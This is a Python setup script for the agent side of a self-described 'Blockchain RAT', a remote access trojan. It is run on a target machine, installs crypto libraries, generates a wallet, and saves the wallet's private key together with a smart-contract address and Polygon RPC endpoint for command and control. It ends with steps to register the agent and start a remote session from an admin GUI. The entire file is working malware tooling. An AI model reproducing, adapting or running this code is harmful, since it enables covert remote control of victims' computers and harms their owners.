#!/usr/bin/env python3
"""
Simple Agent Setup
Run this on the target machine to set up the agent
"""

import os
import sys
import json
import subprocess

print("=" * 70)
print("BLOCKCHAIN RAT - AGENT SETUP")
print("=" * 70)
print()

# Configuration (update these)
CONTRACT_ADDRESS = "0x5031fB08D66ea1181eaE1d89f6E960a4f26c3280"
RPC_URL = "https://polygon-rpc.com"

# Step 1: Install dependencies
print("[1/4] Installing dependencies...")
print("This may take 30-60 seconds...")
try:
    subprocess.check_call(
        [sys.executable, '-m', 'pip', 'install', '--quiet',
         'web3>=6.0', 'eth-account>=0.8', 'cryptography>=40.0', 'pycryptodome>=3.15'],
    )
    print("✓ Dependencies installed\n")
except Exception as e:
    print(f"! Warning: {e}")
    print("Continuing...\n")

# Step 2: Import and generate wallet
print("[2/4] Generating agent wallet...")
try:
    from eth_account import Account
    agent_account = Account.create()
    agent_address = agent_account.address
    agent_key = agent_account.key.hex()
    print(f"✓ Agent Address: {agent_address}\n")
except Exception as e:
    print(f"✗ Failed: {e}")
    sys.exit(1)

# Step 3: Create config
print("[3/4] Creating configuration...")
config = {
    "rpc_url": RPC_URL,
    "contract_address": CONTRACT_ADDRESS,
    "private_key": agent_key,
    "poll_interval": 10
}

with open("agent_config.json", 'w') as f:
    json.dump(config, f, indent=2)
print("✓ Config saved: agent_config.json\n")

# Step 4: Instructions
print("[4/4] Setup complete!")
print()
print("=" * 70)
print("NEXT STEPS")
print("=" * 70)
print()
print(f"1. Send 0.01 MATIC to agent for gas:")
print(f"   {agent_address}")
print()
print("2. Copy the 'agent' and 'shared' folders here")
print()
print("3. Register the agent:")
print("   python agent/agent.py --register --config agent_config.json")
print()
print("4. The admin GUI will auto-detect and create a session")
print()
print("5. Start the agent with the session ID from the GUI popup:")
print("   python agent/agent.py --session SESSION_ID --config agent_config.json")
print()
print("=" * 70)
print()
print(f"Agent wallet saved in: agent_config.json")
print()

